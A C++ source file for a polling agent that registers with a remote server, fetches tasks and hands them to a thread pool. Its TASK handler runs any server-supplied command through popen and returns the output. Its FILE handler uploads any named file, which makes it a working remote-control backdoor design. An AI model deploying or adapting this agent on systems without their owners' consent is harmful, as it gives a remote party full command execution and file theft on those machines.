// src/polling.cpp
// Config loader | Thread-safe Logger | Task handlers | Adaptive backoff | Thread pool dispatch

#include "agent.h"
#include "thread_pool.h"

#include <iostream>
#include <fstream>
#include <sstream>
#include <array>
#include <cstdio>
#include <cstdlib>
#include <algorithm>
#include <iomanip>

// ═══════════════════════════════════════════════════════════════════════════════
//  CONFIG LOADER
// ═══════════════════════════════════════════════════════════════════════════════

namespace Config {

static std::string read_raw(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return {};
    std::ostringstream ss; ss << f.rdbuf();
    return ss.str();
}

void load(const std::string& path) {
    CONFIG_FILE = path;
    std::string raw = read_raw(path);
    if (raw.empty())
        throw std::runtime_error("Config file missing or empty: " + path);

    // Заполняем значения из JSON
    auto get = [&](const std::string& k) { return Json::get(raw, k); };

    if (auto v = get("base_url"))              BASE_URL           = *v;
    if (auto v = get("server_uri"))            BASE_URL           = *v;  // alias
    if (auto v = get("uid"))                   AGENT_UID          = *v;
    if (auto v = get("description"))           AGENT_DESC         = *v;
    if (auto v = get("poll_interval_sec"))     try { POLL_INTERVAL_SEC   = std::stoi(*v); } catch(...) {}
    if (auto v = get("backoff_max_sec"))       try { BACKOFF_MAX_SEC      = std::stoi(*v); } catch(...) {}
    if (auto v = get("max_reg_retries"))       try { MAX_REG_RETRIES      = std::stoi(*v); } catch(...) {}
    if (auto v = get("request_timeout_sec"))   try { REQUEST_TIMEOUT_SEC  = std::stol(*v); } catch(...) {}
    if (auto v = get("connect_timeout_sec"))   try { CONNECT_TIMEOUT_SEC  = std::stol(*v); } catch(...) {}
    if (auto v = get("task_dir"))              TASK_DIR           = *v;
    if (auto v = get("result_dir"))            RESULT_DIR         = *v;
    if (auto v = get("log_dir"))               LOG_DIR            = *v;

    // Переменные окружения перекрывают JSON (наивысший приоритет)
    if (auto e = std::getenv("AGENT_BASE_URL"))      BASE_URL   = e;
    if (auto e = std::getenv("AGENT_UID"))           AGENT_UID  = e;
    if (auto e = std::getenv("AGENT_POLL_INTERVAL"))
        try { POLL_INTERVAL_SEC = std::stoi(e); } catch(...) {}

    // Валидация обязательных полей
    if (BASE_URL.empty())
        throw std::runtime_error("Config validation: base_url is required");
    if (AGENT_UID.empty())
        throw std::runtime_error("Config validation: uid is required");
    if (POLL_INTERVAL_SEC <= 0)
        throw std::runtime_error("Config validation: poll_interval_sec must be > 0");
}

bool save_access_code(const std::string& code) {
    std::string cfg = read_raw(CONFIG_FILE);
    if (cfg.empty())
        cfg = "{\"uid\":\"" + AGENT_UID + "\",\"base_url\":\"" + BASE_URL + "\"}";

    // Заменить существующее поле или вставить перед '}'
    auto upsert = [&](const std::string& key, const std::string& val) {
        std::string sk = '"' + key + '"';
        std::size_t p  = cfg.find(sk);
        if (p != std::string::npos) {
            std::size_t c = cfg.find(':', p + sk.size());
            std::size_t s = cfg.find('"', c);
            std::size_t e = cfg.find('"', s + 1);
            if (c != std::string::npos && s != std::string::npos && e != std::string::npos)
                cfg.replace(s + 1, e - s - 1, val);
        } else {
            std::size_t b = cfg.rfind('}');
            if (b != std::string::npos)
                cfg.insert(b, ",\"" + key + "\":\"" + val + "\"");
        }
    };
    upsert("access_code", code);

    std::ofstream f(CONFIG_FILE, std::ios::binary | std::ios::trunc);
    if (!f) return false;
    f << cfg;
    return true;
}

bool load_access_code(std::string& out) {
    std::string raw = read_raw(CONFIG_FILE);
    if (raw.empty()) return false;
    auto v = Json::get(raw, "access_code");
    if (!v || v->empty()) return false;
    out = *v;
    return true;
}

}  // namespace Config

// ═══════════════════════════════════════════════════════════════════════════════
//  LOGGER  (thread-safe, structured)
// ═══════════════════════════════════════════════════════════════════════════════

namespace Logger {

static std::mutex    g_mx;
static Level         g_min     = Level::INFO;
static bool          g_to_file = false;
static std::ofstream g_file;

void init(Level min_level, bool to_file, const std::string& log_file) {
    std::lock_guard<std::mutex> lk(g_mx);
    g_min     = min_level;
    g_to_file = to_file;
    if (to_file && !log_file.empty()) {
        g_file.open(log_file, std::ios::app);
        if (!g_file.is_open()) g_to_file = false;
    }
}

static const char* lvl_str(Level l) {
    switch (l) {
        case Level::DEBUG:   return "DEBUG  ";
        case Level::INFO:    return "INFO   ";
        case Level::WARNING: return "WARNING";
        case Level::ERR:     return "ERROR  ";
        case Level::CRIT:    return "CRIT   ";
    }
    return "?      ";
}

void log(Level level, const std::string& msg, const std::string& task_id, const std::string& session_id) {
    if (level < g_min) return;

    auto now = std::chrono::system_clock::now();
    auto ms  = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;
    std::time_t t = std::chrono::system_clock::to_time_t(now);
    char ts[24];
#ifdef _WIN32
    struct tm tb; localtime_s(&tb, &t);
#else
    struct tm tb; localtime_r(&t, &tb);
#endif
    std::strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", &tb);

    std::ostringstream tid_ss;
    tid_ss << std::hex << std::setw(4) << std::setfill('0')
           << (std::hash<std::thread::id>{}(std::this_thread::get_id()) & 0xFFFFu);

    std::ostringstream line;
    line << ts << '.' << std::setw(3) << std::setfill('0') << ms.count()
         << " [" << lvl_str(level) << "]" << " [T:" << tid_ss.str() << "]";
    if (!task_id.empty())    line << " [task="    << task_id    << "]";
    if (!session_id.empty()) line << " [session=" << session_id << "]";
    line << " " << msg;

    std::lock_guard<std::mutex> lk(g_mx);
    std::cout << line.str() << '\n' << std::flush;
    if (g_to_file && g_file.is_open())
        g_file << line.str() << '\n' << std::flush;
}

}  // namespace Logger

// ═══════════════════════════════════════════════════════════════════════════════
//  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ═══════════════════════════════════════════════════════════════════════════════

static std::string unescape_json(const std::string& s) {
    std::string r; r.reserve(s.size());
    for (std::size_t i = 0; i < s.size(); ++i) {
        if (s[i] == '\\' && i + 1 < s.size() && (s[i+1] == '"' || s[i+1] == '\\')) {
            r += s[++i];
            continue;
        }
        r += s[i];
    }
    return r;
}

static std::string extract_json_object(const std::string& s) {
    std::size_t start = s.find('{');
    if (start == std::string::npos) return {};
    int depth = 0;
    for (std::size_t i = start; i < s.size(); ++i) {
        if (s[i] == '{') ++depth;
        else if (s[i] == '}') {
            if (--depth == 0) return s.substr(start, i - start + 1);
        }
    }
    return {};
}

static std::string clean_options(const std::string& raw) {
    std::string u = unescape_json(raw);
    std::string o = extract_json_object(u);
    return o.empty() ? u : o;
}

static std::string pick(const std::string& json, const std::string& key) {
    std::size_t kp = json.find('"' + key + '"');
    if (kp == std::string::npos) return {};
    std::size_t c = json.find(':', kp);
    std::size_t s = json.find('"', c);
    std::size_t e = json.find('"', s + 1);
    if (c == std::string::npos || s == std::string::npos || e == std::string::npos) return {};
    return json.substr(s + 1, e - s - 1);
}

static std::optional<int> extract_interval(const std::string& raw) {
    std::string c = clean_options(raw);
    for (const char* key : {"interval", "INTERVAL"}) {
        std::size_t kp = c.find('"' + std::string(key) + '"');
        if (kp == std::string::npos) continue;
        std::size_t col = c.find(':', kp);
        if (col == std::string::npos) continue;
        std::size_t vs = col + 1;
        while (vs < c.size() && (c[vs] == ' ' || c[vs] == '\t')) ++vs;
        if (vs >= c.size()) continue;
        std::string iv;
        if (c[vs] == '"') {
            std::size_t e = c.find('"', vs + 1);
            if (e == std::string::npos) continue;
            iv = c.substr(vs + 1, e - vs - 1);
        } else {
            std::size_t e = vs;
            while (e < c.size() && c[e] != ',' && c[e] != '}' && c[e] != ' ' && c[e] != '\n') ++e;
            iv = c.substr(vs, e - vs);
        }
        try { if (!iv.empty()) return std::stoi(iv); } catch (...) {}
    }
    return std::nullopt;
}

static std::string read_file(const std::string& p) {
    std::ifstream f(p, std::ios::binary);
    if (!f) return {};
    std::ostringstream ss; ss << f.rdbuf(); return ss.str();
}

static bool write_file(const std::string& p, const std::string& c) {
    std::ofstream f(p, std::ios::binary | std::ios::trunc);
    if (!f) return false;
    f << c; return true;
}

static std::string run_command(const std::string& cmd) {
    std::array<char, 512> buf; std::string r;
#ifdef _WIN32
    FILE* pipe = _popen(cmd.c_str(), "r");
#else
    FILE* pipe = popen(cmd.c_str(), "r");
#endif
    if (!pipe) return "popen failed";
    while (fgets(buf.data(), static_cast<int>(buf.size()), pipe)) r += buf.data();
#ifdef _WIN32
    _pclose(pipe);
#else
    pclose(pipe);
#endif
    return r;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  ОБРАБОТЧИКИ ЗАДАНИЙ
// ═══════════════════════════════════════════════════════════════════════════════

static void handle_conf(const Task& t) {
    Logger::info("[CONF] start", t.task_code, t.session_id);
    std::string opts = t.options;
    for (std::size_t p = 0; (p = opts.find("\\\"", p)) != std::string::npos; p += 1)
        opts.replace(p, 2, "\"");

    std::string cleaned = extract_json_object(opts);
    if (cleaned.empty()) cleaned = opts;

    std::string key   = pick(cleaned, "key");
    std::string value = pick(cleaned, "value");
    if (value.empty()) {
        std::size_t vp = cleaned.find("\"val\"");
        if (vp != std::string::npos) {
            std::size_t br = cleaned.find('[', cleaned.find(':', vp));
            if (br != std::string::npos) {
                std::size_t s = cleaned.find('"', br);
                std::size_t e = cleaned.find('"', s + 1);
                if (s != std::string::npos && e != std::string::npos)
                    value = cleaned.substr(s + 1, e - s - 1);
            }
        }
    }

    if (key.empty() || value.empty()) {
        Logger::warn("[CONF] invalid options structure", t.task_code, t.session_id);
        send_result(t.session_id, -1, "invalid options structure", {});
        return;
    }

    std::string cfg = read_file(Config::CONFIG_FILE);
    if (cfg.empty())
        cfg = "{\"uid\":\"" + Config::AGENT_UID + "\",\"base_url\":\"" + Config::BASE_URL + "\",\"poll_interval_sec\":" + std::to_string(Config::POLL_INTERVAL_SEC) + "}";

    std::string sk = '"' + key + '"';
    std::size_t p  = cfg.find(sk);
    if (p != std::string::npos) {
        std::size_t c = cfg.find(':', p + sk.size());
        std::size_t vs = c + 1;
        while (vs < cfg.size() && cfg[vs] == ' ') ++vs;
        if (cfg[vs] == '"') {
            std::size_t ve = cfg.find('"', vs + 1) + 1;
            cfg.replace(vs, ve - vs, '"' + value + '"');
        } else {
            std::size_t ve = vs;
            while (ve < cfg.size() && cfg[ve] != ',' && cfg[ve] != '}') ++ve;
            cfg.replace(vs, ve - vs, value);
        }
    } else {
        std::size_t b = cfg.rfind('}');
        if (b != std::string::npos)
            cfg.insert(b, ",\"" + key + "\":\"" + value + "\"");
    }

    if (!write_file(Config::CONFIG_FILE, cfg)) {
        Logger::err("[CONF] write failed", t.task_code, t.session_id);
        send_result(t.session_id, -1, "failed to write config", {});
        return;
    }
    if (key == "poll_interval_sec")
        try { int v = std::stoi(value); if (v > 0) Config::POLL_INTERVAL_SEC = v; } catch (...) {}

    Logger::info("[CONF] " + key + "=" + value, t.task_code, t.session_id);
    send_result(t.session_id, 0, "config updated: " + key + " = " + value, {});
}

static void handle_file(const Task& t) {
    Logger::info("[FILE] start", t.task_code, t.session_id);
    std::string cleaned  = clean_options(t.options);
    std::string filename = pick(cleaned, "filename");

    if (filename.empty() || filename == "config.json")
        filename = Config::CONFIG_FILE;

    std::ifstream f(filename);
    if (!f.good()) {
        Logger::err("[FILE] not found: " + filename, t.task_code, t.session_id);
        send_result(t.session_id, -1, "file not found: " + filename, {});
        return;
    }
    f.close();
    Logger::info("[FILE] sending: " + filename, t.task_code, t.session_id);
    send_result(t.session_id, 0, "file attached", {filename});
}

static void handle_task(const Task& t) {
    Logger::info("[TASK] start", t.task_code, t.session_id);
    std::string command = pick(clean_options(t.options), "command");
    if (command.empty()) {
        Logger::warn("[TASK] no command field", t.task_code, t.session_id);
        send_result(t.session_id, -1, "no command in options", {});
        return;
    }
    Logger::info("[TASK] exec: " + command, t.task_code, t.session_id);
    std::string output = run_command(command);
    if (output.empty()) output = "(no output)";
    if (output.size() > 2000) output = output.substr(0, 2000) + "...(truncated)";
    send_result(t.session_id, 0, output, {});
}

static void handle_timeout(const Task& t) {
    Logger::info("[TIMEOUT] start", t.task_code, t.session_id);
    auto iv = extract_interval(t.options);
    if (!iv) {
        Logger::warn("[TIMEOUT] no interval", t.task_code, t.session_id);
        send_result(t.session_id, -1, "no interval in options", {});
        return;
    }
    if (*iv <= 0) { send_result(t.session_id, -1, "interval must be > 0", {}); return; }
    Config::POLL_INTERVAL_SEC = *iv;
    Logger::info("[TIMEOUT] interval=" + std::to_string(*iv) + "s", t.task_code, t.session_id);
    send_result(t.session_id, 0, "interval changed to " + std::to_string(*iv), {});
}

using TaskHandler = std::function<void(const Task&)>;
static const std::map<std::string, TaskHandler> HANDLERS = {
    {"CONF",    handle_conf   },
    {"FILE",    handle_file   },
    {"TASK",    handle_task   },
    {"TIMEOUT", handle_timeout},
};

static void dispatch_task(const Task& task) {
    auto it = HANDLERS.find(task.task_code);
    if (it == HANDLERS.end()) {
        Logger::warn("Unknown task_code='" + task.task_code + "'", task.task_code, task.session_id);
        send_result(task.session_id, -1, "unknown task_code: " + task.task_code, {});
        return;
    }
    try {
        it->second(task);
    } catch (const std::exception& e) {
        Logger::err("Handler exception: " + std::string(e.what()), task.task_code, task.session_id);
        send_result(task.session_id, -1, "internal error: " + std::string(e.what()), {});
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  РЕГИСТРАЦИЯ
// ═══════════════════════════════════════════════════════════════════════════════

bool register_agent() {
    Logger::info("Registering UID=" + Config::AGENT_UID);
    std::string url  = Config::BASE_URL + "/wa_reg/";
    std::string body = Json::build({{"UID", Config::AGENT_UID}, {"descr", Config::AGENT_DESC}});
    try {
        auto resp = Http::post(url, body);
        Logger::info("Register response (" + std::to_string(resp.status_code) + "): " + resp.body);

        if (resp.status_code != 200) {
            Logger::err("HTTP error: " + std::to_string(resp.status_code));
            return false;
        }
        auto code_opt = Json::get(resp.body, "code_responce");
        if (!code_opt) { Logger::err("No code_responce in response"); return false; }
        int code = std::stoi(*code_opt);

        if (code == 0) {
            std::string ac = Json::get(resp.body, "access_code").value_or("");
            if (ac.empty()) { Logger::err("Registration ok but access_code absent"); return false; }
            g_state.access_code = ac;
            Logger::info("Registered. access_code=" + ac);
            if (!Config::save_access_code(ac))
                Logger::warn("Could not persist access_code to config");
            return true;
        }
        if (code == -3) {
            Logger::warn("Already registered (code=-3). Loading saved access_code.");
            std::string saved;
            if (Config::load_access_code(saved) && !saved.empty()) {
                g_state.access_code = saved;
                Logger::info("Loaded saved access_code");
                return true;
            }
            Logger::err("No saved access_code found after -3");
            return false;
        }
        Logger::err("Unexpected code_responce=" + std::to_string(code));
        return false;

    } catch (const std::exception& e) {
        Logger::err("Register error: " + std::string(e.what()));
        return false;
    }
}

static bool try_reregister() {
    g_state.reset();
    int backoff = 5;
    for (int i = 1; i <= Config::MAX_REG_RETRIES; ++i) {
        Logger::info("Re-register attempt " + std::to_string(i) + "/" + std::to_string(Config::MAX_REG_RETRIES));
        if (register_agent()) { Logger::info("Re-register OK"); return true; }
        Logger::info("Waiting " + std::to_string(backoff) + "s...");
        std::this_thread::sleep_for(std::chrono::seconds(backoff));
        backoff = std::min(backoff * 2, Config::BACKOFF_MAX_SEC);
    }
    Logger::crit("Re-register failed after all attempts");
    return false;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  ЗАПРОС ЗАДАНИЯ
// ═══════════════════════════════════════════════════════════════════════════════

int request_task(Task& out) {
    std::string url  = Config::BASE_URL + "/wa_task/";
    std::string body = Json::build({
        {"UID",         Config::AGENT_UID  },
        {"descr",       Config::AGENT_DESC },
        {"access_code", g_state.access_code}
    });
    try {
        auto resp = Http::post(url, body);

        if (resp.status_code != 200) {
            Logger::err("HTTP error requesting task: " + std::to_string(resp.status_code));
            return -99;
        }
        auto code_opt = Json::get(resp.body, "code_responce");
        if (!code_opt) {
            Logger::err("Malformed task response: " + resp.body);
            return -99;
        }
        int code = std::stoi(*code_opt);

        if (code == 1) {
            out.task_code  = Json::get(resp.body, "task_code") .value_or("");
            out.session_id = Json::get(resp.body, "session_id").value_or("");
            out.status     = Json::get(resp.body, "status")    .value_or("");

            std::size_t os = resp.body.find("\"options\":\"");
            if (os != std::string::npos) {
                os += 11;
                std::size_t oe = resp.body.find("\",\"session_id\"", os);
                if (oe != std::string::npos)
                    out.options = resp.body.substr(os, oe - os);
            }

            if (!out.is_valid()) {
                Logger::warn("Invalid task payload (empty task_code or session_id), skipping");
                return 0;
            }
            Logger::info("Task received", out.task_code, out.session_id);
            return 1;
        }
        if (code == 0)  return 0;
        if (code == -2) { Logger::err("Invalid access_code (code=-2)"); return -2; }
        Logger::warn("Unexpected server response: " + resp.body);
        return -99;

    } catch (const std::exception& e) {
        Logger::err("Network error: " + std::string(e.what()));
        return -99;
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  ГЛАВНЫЙ ЦИКЛ
// ═══════════════════════════════════════════════════════════════════════════════

void polling_loop() {
    int n_workers = 4;
    if (auto e = std::getenv("AGENT_WORKERS"))
        try { n_workers = std::max(1, std::stoi(e)); } catch (...) {}

    ThreadPool pool(static_cast<std::size_t>(n_workers));

    int  normal_interval  = Config::POLL_INTERVAL_SEC;
    int  current_interval = normal_interval;
    int  backoff_step     = normal_interval;
    bool in_backoff       = false;

    Logger::info("Polling started. interval=" + std::to_string(normal_interval) + "s workers=" + std::to_string(n_workers));

    while (!g_state.shutdown_requested.load()) {

        if (!in_backoff) {
            current_interval = Config::POLL_INTERVAL_SEC;
        }

        Task task;
        int result = request_task(task);

        if (result == 1) {
            if (in_backoff) {
                Logger::info("Server reachable. Restoring interval=" + std::to_string(Config::POLL_INTERVAL_SEC) + "s");
                in_backoff       = false;
                backoff_step     = Config::POLL_INTERVAL_SEC;
                current_interval = Config::POLL_INTERVAL_SEC;
            }
            pool.submit([task]{ dispatch_task(task); });

        } else if (result == 0) {
            if (in_backoff) {
                Logger::info("Server OK (no task). Restoring interval.");
                in_backoff   = false;
                backoff_step = Config::POLL_INTERVAL_SEC;
            }

        } else if (result == -2) {
            if (!try_reregister()) {
                Logger::crit("Cannot recover session. Shutting down.");
                g_state.shutdown_requested.store(true);
                break;
            }
            in_backoff       = false;
            backoff_step     = Config::POLL_INTERVAL_SEC;
            current_interval = Config::POLL_INTERVAL_SEC;
            continue;

        } else {
            if (!in_backoff) {
                Logger::warn("Server unreachable. Starting backoff.");
                in_backoff   = true;
                backoff_step = std::max(current_interval, 5);
            }
            current_interval = backoff_step;
            Logger::warn("Backoff interval=" + std::to_string(current_interval) + "s" + " (next=" + std::to_string(std::min(backoff_step * 2, Config::BACKOFF_MAX_SEC)) + "s)");
            backoff_step = std::min(backoff_step * 2, Config::BACKOFF_MAX_SEC);
        }

        Logger::info("Next poll in " + std::to_string(current_interval) + "s (queue=" + std::to_string(pool.pending()) + ")");

        for (int s = 0; s < current_interval && !g_state.shutdown_requested.load(); ++s)
            std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    Logger::info("Polling loop exiting. Draining " + std::to_string(pool.pending()) + " queued tasks...");
    pool.shutdown();
    Logger::info("All workers finished.");
}
